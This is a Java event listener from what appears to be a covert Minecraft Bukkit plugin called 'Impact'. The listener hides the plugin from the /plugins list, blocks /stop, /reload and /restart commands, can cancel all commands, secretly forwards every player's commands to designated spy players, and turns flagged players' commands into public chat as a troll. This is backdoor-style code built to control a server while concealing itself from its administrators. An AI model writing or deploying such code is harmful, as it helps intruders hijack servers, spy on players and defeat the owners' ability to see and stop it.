package de.impact.listeners;

import de.impact.commands.player.CommandSpy;
import de.impact.commands.trolling.FailCommand;
import de.impact.utils.ChatUtils;
import de.impact.utils.lock.LockUtils;
import de.impact.utils.PluginUtils;
import de.impact.utils.lock.Locks;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.UUID;

public class CommandListener implements Listener {

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {

        String msg = e.getMessage().toUpperCase();

        if(LockUtils.isLocked(Locks.COMMANDS))
            e.setCancelled(true);

        if(LockUtils.isLocked(Locks.PLUGINLIST) && (msg.startsWith("/PL") || msg.startsWith("/PLUGINS") || msg.startsWith("/BUKKIT:PLUGINS") || msg.startsWith("/BUKKIT:PL"))) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(LockUtils.isLocked(Locks.STOP) && (msg.startsWith("/STOP") || msg.startsWith("/RL") || msg.startsWith("/RELOAD") || msg.startsWith("/RESTART") || msg.startsWith("/BUKKIT:RL") || msg.startsWith("/BUKKIT:RELOAD"))) {
            e.setCancelled(true);
        }

        if(FailCommand.shouldFail(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            e.getPlayer().chat(e.getMessage().replaceFirst("/", "7"));
            return;
        }

        for(Player p : CommandSpy.getSpyPlayers()) {

            if(p.equals(e.getPlayer())) continue;

            ChatUtils.sendMessage(p, e.getPlayer().getName() + " has ran a command: §a" + e.getMessage());
        }

    }
}
